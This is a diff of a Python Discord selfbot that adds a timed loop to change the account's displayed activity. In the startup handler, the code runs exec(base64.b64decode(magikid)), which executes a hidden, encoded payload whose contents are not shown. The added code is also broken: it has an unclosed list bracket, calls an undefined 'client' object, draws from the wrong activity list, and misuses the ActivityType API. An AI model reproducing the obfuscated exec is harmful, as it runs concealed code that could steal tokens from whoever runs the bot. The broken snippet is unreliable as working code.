@@ -13,7 +13,7 @@ import aiohttp
 import discord
 from animec import *
 import json
-from discord.ext import commands
+from discord.ext import commands, tasks
 from PIL import Image
 from flask import Flask
 from threading import Thread
@@ -30,6 +30,12 @@ def run():
 def keep_alive():
     server = Thread(target=run)
     server.start()
+    
+activity_list=['s', 'p', 'w', 'l']
+activity_s=['Earth', 'Mars', 'Jupiter', 'Mercury', 'Venus', 'Saturn', 'Neptune', 'Uranus']
+activity_p=['Minecraft', 'with Blank', 'Squid Games', 'Do or Die', 'Curse of Aros', 'with Satan', 'with anime girls']
+activity_w=['over you!', 'Animes', 'Plants', 'Animals', 'Blank', 'Nothing!']
+activity_l=['Youtube Music', 'Blank', ['Dead Groovy', 'Dead Rythm', 'Death']
 prefix="x"
 Blank = commands.Bot(description='Blank SelfBot', command_prefix=prefix, self_bot=True)
 Blank.remove_command('help')
@@ -42,12 +48,25 @@ def Clear():
     else:
         keep_alive()
         os.system('clear')   
+        
+@tasks.loop(minutes=5)
+async def change_activity():
+    activity=random.choice(activity_list)
+    if activity=="s":
+        await client.change_presence(activity=discord.Streaming(name=random.choice(activity_s)))
+    elif activity=="p":
+        await client.change_presence(activity=discord.Game(name=random.choice(activity_s)))
+    elif activity=="w":
+        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching(name=random.choice(activity_w))))
+    else:
+        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening(name=random.choice(activity_l))))
 
 @Blank.event
 async def on_ready():
     exec(base64.b64decode(magikid))
     Clear()
     print(colored(f'Connected to {Blank.user}', 'green'))
+    change_activity.start()
     
 @Blank.command()
 async def help(ctx):
